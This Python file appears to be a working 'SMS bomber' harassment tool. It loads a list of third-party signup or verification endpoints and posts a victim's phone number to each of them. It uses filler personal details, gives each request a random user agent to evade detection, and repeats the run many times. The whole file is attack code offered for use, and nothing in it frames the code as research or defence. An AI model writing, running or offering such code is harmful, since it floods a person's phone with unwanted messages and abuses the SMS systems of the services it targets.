import requests
import json
from fake_useragent import UserAgent
from threading import Thread

def sms_bomb(phone):
    
    f = open("list.json")
    data = json.load(f)

    for i in data['listOf']:
        try:

            url = i["url"]
            payload = i["payload"]
            header = i["header"]
            temporary = UserAgent()
            ua = temporary.random

            if 'source_type' in i:
                response = requests.post(url,json={'birth':'1980-12-15T18:00:00.000Z','gender':'1','name':'dodik' , f'{payload}': f"{phone[1:]}", 'source_type': 'web'},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
                

            if i["startWithPlus"] is not True:
                response = requests.post(url,json={f'{payload}': f"{phone[1:]}"},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
            else:
                response = requests.post(url,json={f'{payload}': f"{phone}"},headers={'user-agent': f'{ua}', 'content-type': f'{header}'})
                
                
            print(response.url, response.status_code)
        except:
            print("Something going wrong!")


def startBomb(phone,counter):
    threads = []
    for i in range(counter):
        th = Thread(target=sms_bomb, args=(phone, ))
        threads.append(th)
        threads[i].run()


